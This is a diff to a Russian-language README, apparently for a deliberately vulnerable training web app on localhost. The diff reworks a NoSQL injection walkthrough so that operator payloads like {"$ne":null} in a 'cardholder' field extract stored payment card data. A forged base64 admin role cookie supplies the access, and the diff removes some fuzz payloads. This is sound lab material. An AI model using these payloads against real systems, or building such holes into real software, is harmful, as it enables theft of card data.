@@ -103,23 +103,16 @@ curl "http://localhost:8000/admin/reports?u=alice" -b "role=YWRtaW4="
 ```
 
 ### NoSQL Injection (`/product/<pid>/reviews/moderation`)
+Сценарий: сначала при checkout сохраняется объект карты в Mongo (`payment_cards`), после чего в админ-модерации можно сделать operator injection в поле `cardholder`.
+
+1) Создать заказ с картой через `/cart/checkout` (форма корзины теперь просит cardholder/card/exp/cvv).
+2) Открыть `/product/1/reviews/moderation` под админом.
+3) В `cardholder` отправить операторный payload.
+
 ```bash
 curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  -d 'author={"$ne":null}&rating={"$gt":0}' \
-  -b "role=YWRtaW4="
-```
-
-Для быстрой идентификации NoSQLi-like точек также можно использовать fuzz-пейлоады:
-```bash
-curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  --data-urlencode "author=\"'`\{\n;$Foo}" \
-  -b "role=YWRtaW4="
-
-curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  --data-urlencode "author=$Foo \\xYZ" \
+  -d 'cardholder={"$ne":null}' \
   -b "role=YWRtaW4="
 ```
 
